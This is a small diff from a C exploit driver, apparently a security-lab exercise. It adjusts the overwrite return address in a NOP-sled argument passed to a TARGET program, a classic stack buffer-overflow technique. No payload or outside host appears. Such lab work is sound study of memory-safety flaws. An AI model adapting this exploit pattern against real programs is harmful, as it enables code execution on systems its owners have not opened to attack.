@@ -13,7 +13,7 @@ int main(void)
   char *env[1];
 
   args[0] = TARGET;
-  args[1] = "\x90\x90\x90\x90\x90\x90\x90\x90\x49\xfe\xff\xbf";
+  args[1] = "\x90\x90\x90\x90\x90\x90\x90\x90\x4a\xfe\xff\xbf";
   // 0xbffffe50
   args[2] = NULL;
   
